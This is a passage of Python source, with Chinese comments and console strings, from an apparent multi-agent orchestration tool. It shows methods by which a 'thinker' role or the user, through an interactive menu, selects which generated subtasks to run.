        self, subtasks: list[dict], reasoning: str,
    ) -> tuple[list[int], str]:
        """思考者自动评估并选择子任务。"""
        renderer = self._renderer
        renderer.console.print(
            "  [dim bold]🤔 思考者正在评估子任务...[/]"
        )

        tasks_text = "\n".join(
            f"  [{i}] 角色={t.get('role', '?')} | {t.get('task_description', '')[:200]}"
            for i, t in enumerate(subtasks)
        )

        decision = self._call_role_with_timeout(
            AgentRole.THINKER, "",
            context=f"## 决策者分析\n{reasoning[:500]}\n\n## 子任务\n{tasks_text}",
            extra_instruction="请评估以上子任务并输出 JSON 决策。",
        )
        parsed = self._parse_json(decision)
        selected = parsed.get("selected_indices", list(range(len(subtasks))))
        additional = parsed.get("additional_context", "")
        concerns = parsed.get("concerns", "")
        think_reasoning = parsed.get("reasoning", "")

        renderer.console.print(
            f"  [dim]思考者: {think_reasoning[:200]}[/]"
        )
        if additional:
            renderer.console.print(
                f"  [dim yellow]补充: {additional[:200]}[/]"
            )
        if concerns:
            renderer.console.print(
                f"  [dim red]注意: {concerns[:200]}[/]"
            )

        return selected, additional

    def _user_select(
        self, subtasks: list[dict], reasoning: str, iteration: int,
    ) -> tuple[list[int], str]:
        """通过交互式菜单让用户选择子任务。"""
        import sys
        if not sys.stdin.isatty():
            return list(range(len(subtasks))), ""

        from ..cli.selection_ui import present_multi_select_menu, SelectableOption
        renderer = self._renderer

        renderer.console.print(
            f"  [bold cyan]决策者分析:[/] [dim]{reasoning[:300]}[/]"
        )

        options = []
        for i, task in enumerate(subtasks):
            role = task.get("role", "?")
            desc = task.get("task_description", "")
            options.append(SelectableOption(
                key=f"{role}_{i}",
                label=f"[{role}] {desc}",
                metadata={"index": i, "role": role},
            ))

        result = present_multi_select_menu(
            options,
            title=f"第{iteration}轮 - 选择要执行的子任务",
        )

        if result.get("action") == "cancelled":
            return [], ""

        selected_keys = set(result.get("selected_keys", []))
        if not selected_keys:
            # 没选任何项，默认选全部
            return list(range(len(subtasks))), ""

        indices = []
        for key in selected_keys:
            for i, task in enumerate(subtasks):
                role = task.get("role", "?")
                if key == f"{role}_{i}" or key == str(i):
                    indices.append(i)
                    break

        custom_text = result.get("custom_text", "")
        return sorted(set(indices)) if indices else list(range(len(subtasks))), custom_text

    @staticmethod
    def _str_to_role(s: str) -> AgentRole:
        try:
            return AgentRole(s)
        except ValueError:
            return AgentRole.RUNNER
